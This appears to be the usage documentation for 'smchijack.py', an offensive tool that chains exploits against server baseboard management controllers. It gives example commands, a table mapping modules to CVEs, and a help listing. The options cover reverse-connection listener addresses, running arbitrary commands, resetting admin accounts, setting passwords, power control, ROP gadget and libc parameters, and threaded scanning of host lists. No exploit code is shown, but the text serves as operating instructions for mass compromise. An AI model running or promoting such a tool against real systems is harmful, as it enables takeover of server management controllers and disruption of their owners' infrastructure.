# self-test every builder without touching a target
./smchijack.py --self-test

# default chain against one BMC
./smchijack.py 10.0.0.5

# every module, JSON output, caller-supplied beacon address
./smchijack.py 10.0.0.5 --all -l 10.0.0.1 -p 8899 --json out.json

# read-only: no user reset, no password set, no power control
./smchijack.py 10.0.0.5 --safe

# stop the moment anything succeeds
./smchijack.py 10.0.0.5 --stop-on-pwn

# scan a list, eight at a time
./smchijack.py hosts.txt --threads 8

## KEY    ## CVE
65219    CVE-2026-65219
18449    CVE-2026-18449
18450    CVE-2026-18450
36435    CVE-2024-36435
33411    CVE-2023-33411
33412    CVE-2023-33412
33413    CVE-2023-33413
6387     CVE-2024-6387

usage: smchijack [-h] [--lhost LHOST] [-p LPORT] [--command COMMAND]
                 [--all] [--modules MODULES] [--creds [CREDS ...]]
                 [--user [USER ...]] [--file [FILE ...]] [--sid SID]
                 [--seq SEQ] [--scan-sids] [--reset-admin UID:PW]
                 [--set-password UID:PW] [--power POWER]
                 [--config-key CONFIG_KEY] [--config-iv CONFIG_IV]
                 [--config-cipher {cbc,ecb}]
                 [--libc-base LIBC_BASE] [--gadget1 GADGET1]
                 [--gadget2 GADGET2] [--system SYSTEM]
                 [--attempts ATTEMPTS] [--connections CONNECTIONS]
                 [--grace GRACE] [--safe] [--stop-on-pwn]
                 [--threads THREADS] [--timeout TIMEOUT] [--proxy PROXY]
                 [--json JSON] [--quiet] [--no-colour] [--debug]
                 [--self-test]
                 [targets ...]
